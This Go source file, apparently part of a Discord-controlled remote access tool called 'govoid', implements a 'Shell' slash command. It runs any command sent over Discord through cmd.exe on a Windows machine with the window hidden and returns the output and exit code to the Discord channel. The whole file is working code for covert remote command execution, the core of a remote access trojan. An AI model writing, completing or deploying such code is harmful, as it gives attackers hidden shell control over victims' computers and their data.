//go:build windows

package commands

import (
	"context"
	"errors"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
)

func Shell(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	command := StringOption(i, "cmd")
	if isBlank(command) {
		Finish(s, i, "❌ Comando vacío.")
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), shellTimeout)
	defer cancel()

	output, exitCode, timedOut := runShell(ctx, command)

	color := 3066993
	title := fmt.Sprintf("✅ Shell — exit %d", exitCode)
	if exitCode != 0 {
		color = 15158332
		title = fmt.Sprintf("❌ Shell — exit %d", exitCode)
	}
	if timedOut {
		title += " — timeout 30s"
	}

	body := output
	if isBlank(body) {
		body = "(sin salida)"
	}
	body = strings.ReplaceAll(body, "```", "'''")

	head := util.SafeCut(body, 3900)
	rest := body[len(head):]

	embed := &discordgo.MessageEmbed{
		Title:       title,
		Description: "```\n" + head + "\n```",
		Color:       color,
		Timestamp:   nowTimestamp(),
	}

	content := fmt.Sprintf("💻 `%s`", truncate(command, 200))
	embeds := []*discordgo.MessageEmbed{embed}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Embeds:  &embeds,
	}); err != nil {
		return
	}

	if rest != "" {
		FollowupChunks(s, i, rest)
	}
}

const shellTimeout = 30 * time.Second

func runShell(ctx context.Context, command string) (string, int, bool) {
	cmd := exec.CommandContext(ctx, "cmd.exe", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
	cmd.Cancel = func() error {
		if cmd.Process == nil {
			return nil
		}
		killer := exec.Command("taskkill", "/F", "/T", "/PID", strconv.Itoa(cmd.Process.Pid))
		killer.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: createNoWindow}
		_ = killer.Run()
		return cmd.Process.Kill()
	}
	cmd.WaitDelay = 2 * time.Second

	output, err := cmd.CombinedOutput()

	exitCode := 0
	if err != nil {
		var exitErr *exec.ExitError
		if errors.As(err, &exitErr) {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	return string(output), exitCode, ctx.Err() == context.DeadlineExceeded
}
